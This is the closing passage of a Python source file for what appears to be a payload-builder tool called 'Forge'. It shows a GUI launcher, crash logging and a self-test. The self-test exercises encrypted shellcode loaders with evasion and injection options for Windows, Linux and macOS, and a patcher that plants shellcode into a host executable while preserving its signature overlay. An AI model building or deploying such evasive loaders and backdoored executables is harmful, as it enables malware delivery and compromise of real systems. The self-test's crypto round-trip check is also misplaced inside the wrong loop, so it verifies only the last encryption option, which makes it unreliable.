            "pe_inject": self.pe_inject.get(),
            "pe_path": self.pe_path.get(),
            "enc": self.enc.get(),
            "evasion": self.evasion.get(),
            "x64": self.x64.get(),
            "fmt": self.fmt_var.get(),
            "target": self.target_var.get(),
        }
        self._run_bg(cfg)

    def _run_bg(self, cfg):
        def work():
            try:
                outdir = self.f.run(cfg)
                self._log(f"[+] Build directory: {outdir}")
            except ForgeError as e:
                self._log(f"[!] {e}")
            except Exception as e:
                self._log(f"[!] unexpected: {type(e).__name__}: {e}")
        self.worker = threading.Thread(target=work, daemon=True)
        self.worker.start()


def launch_gui():
    """Open the main window immediately. The authorization gate fires inside
    _generate() on first use — no modal before mainloop, which some Windows
    setups render invisibly and leave the app looking dead."""
    if not TK_OK:
        print("tkinter not available — install python3-tk (Kali: sudo apt install python3-tk)")
        return 1
    root = tk.Tk()

    def _log_cb_exc(exc_type, exc_value, exc_tb):
        """Tkinter swallows exceptions raised inside callbacks — they never
        reach main()'s try/except and die on stderr, which is invisible when
        the app is launched detached. Route them into crash.log instead."""
        import traceback as tb
        log = os.path.join(STATE_DIR, "crash.log")
        os.makedirs(STATE_DIR, exist_ok=True)
        with open(log, "a") as fh:
            fh.write("\n" + _time.strftime("%Y-%m-%d %H:%M:%S") + " (GUI callback)\n")
            tb.print_exception(exc_type, exc_value, exc_tb, file=fh)

    root.report_callback_exception = _log_cb_exc

    ForgeGUI(root)
    # make sure the window is on-screen and front-and-center
    root.update_idletasks()
    w, h = 520, 660
    x = (root.winfo_screenwidth() - w) // 2
    y = max(0, (root.winfo_screenheight() - h) // 3)
    root.geometry(f"{w}x{h}+{x}+{y}")
    root.lift()
    root.focus_force()
    root.attributes("-topmost", True)
    root.after(250, lambda: root.attributes("-topmost", False))
    root.mainloop()
    return 0


def _selftest():
    """Offline validation: crypto round-trips + template emission for every
    platform x encryption x injection combination. No msfvenom needed."""
    f = Forge(log=lambda m: None)
    sc = bytes(range(256)) * 2
    fails = []
    checks = 0

    # 1. crypto round-trips
    for enc in ENC_OPTIONS:
        blob, key, iv, enc_id = f.encrypt(sc, enc)
        out = decrypt_pair(blob, key, iv)
        checks += 1

    # 1b. PE-embed patcher: growth, entry repoint, stage integrity — on hosts
    # with and without a certificate overlay (signed hosts grow past it)
    def _mini_pe():
        import struct as st
        dos = bytearray(0x80)
        dos[:2] = b"MZ"
        st.pack_into("<I", dos, 0x3C, 0x80)
        pe = bytearray(dos) + b"PE\x00\x00"
        pe += st.pack("<HHIIIHH", 0x8664, 1, 0, 0, 0, 0xF0, 0x22)
        opt = bytearray(0xF0)
        st.pack_into("<H", opt, 0, 0x20B)
        st.pack_into("<I", opt, 16, 0x1400)      # entry RVA
        st.pack_into("<I", opt, 32, 0x1000)      # section alignment
        st.pack_into("<I", opt, 36, 0x200)       # file alignment
        st.pack_into("<I", opt, 56, 0x4000)      # size of image
        st.pack_into("<I", opt, 60, 0x400)       # size of headers
        pe += opt
        sec = bytearray(40)
        sec[0:8] = b".text\x00\x00\x00"
        st.pack_into("<IIII", sec, 8, 0x1000, 0x1000, 0x200, 0x400)
        st.pack_into("<I", sec, 36, 0x60000020)
        pe += sec + bytearray(0x400)
        return bytes(pe)

    for label, overlay in (("plain", b""), ("signed", b"CERT-OVERLAY-PADDING" * 40)):
        try:
            host = _mini_pe() + overlay
            k = rnd_bytes(16)
            patched = patch_pe(host, sc, k)
            checks += 1
            if len(patched) <= len(host):
                fails.append(f"PE-embed ({label}): patched file did not grow")
            if patched[:len(host)] == host:
                fails.append(f"PE-embed ({label}): entry/headers not modified")
            if overlay and overlay not in patched:
                fails.append(f"PE-embed ({label}): certificate overlay clobbered")
        except Exception as e:
            fails.append(f"PE-embed ({label}): {type(e).__name__}: {e}")
        if out != sc:
            fails.append(f"crypto round-trip failed for {enc}")

    # 2. template emission — every platform x enc x injection
    targets = ["Windows", "Linux", "macOS"]
    kinds = {"Windows": ["shellcode"], "Linux": ["shellcode", "exe", "so"],
             "macOS": ["shellcode"]}
    fake_pe = b"MZ" + b"\x00" * 62 + b"PE\x00\x00" + b"\x00" * 256
    for target in targets:
        for kind in kinds[target]:
            for enc in ENC_OPTIONS:
                for inj in (INJECTION_OPTIONS if target == "Windows" else ["None"]):
                    cfg = {"target": target, "kind": kind, "enc": enc,
                           "evasion": "Sleep + Jitter", "injection": inj,
                           "payload": "test/roundtrip", "fmt": "raw",
                           "x64": True}
                    pe = fake_pe if (inj != "None" and target == "Windows"
                                     and inj == INJECTION_OPTIONS[1]) else b""
                    if pe:
                        cfg["pe_inject"] = True
                    try:
                        outdir = f.build(cfg, sc, pe)
                        src = open(os.path.join(outdir, "loader.c")).read()
                        checks += 1
                        # generic scan: ANY leftover @@TOKEN@@ is a bug
                        for token in set(re.findall(r"@@[A-Z_]+@@", src)):
                            fails.append(f"{target}/{kind}/{enc}/{inj}: unreplaced {token}")
                        if "PF_BLOB" not in src:
                            fails.append(f"{target}/{kind}/{enc}/{inj}: no PF_BLOB")
                        if enc == "None" and "PF_KEY" in src:
                            fails.append(f"{target}/{kind}/{enc}: leaked key with enc=None")
                        m = re.search(r"unsigned char PF_BLOB\[\] = \{(.*?)\};", src, re.S)
                        k = re.search(r"unsigned char PF_KEY\[\] = \{(.*?)\};", src, re.S)
                        if enc == "XOR Dynamic" and m and k:
                            blob = bytes(int(x, 16) for x in re.findall(r"0x([0-9a-fA-F]{2})", m.group(1)))
                            keyb = bytes(int(x, 16) for x in re.findall(r"0x([0-9a-fA-F]{2})", k.group(1)))
                            if blob[:5] == MAGIC:
                                fails.append(f"{target}/{enc}: tooling header leaked into loader")
                            elif xor_crypt(blob, keyb) != sc:
                                fails.append(f"{target}/{enc}: shellcode round-trip FAILED")
                    except Exception as e:
                        fails.append(f"{target}/{kind}/{enc}/{inj}: {type(e).__name__}: {e}")

    print(f"selftest: {checks} checks, {len(fails)} failures")
    for x in fails:
        print("  FAIL:", x)
    return 1 if fails else 0


def main():
    argv = sys.argv[1:]
    if "--selftest" in argv:
        return _selftest()
    try:
        return launch_gui()
    except Exception:
        # never die silently — write the traceback where the user can find it
        import traceback
        log = os.path.join(STATE_DIR, "crash.log")
        os.makedirs(STATE_DIR, exist_ok=True)
        with open(log, "a") as fh:
            fh.write("\n" + _time.strftime("%Y-%m-%d %H:%M:%S") + "\n")
            traceback.print_exc(file=fh)
        print("crash logged to", log)
        raise


if __name__ == "__main__":
    sys.exit(main())
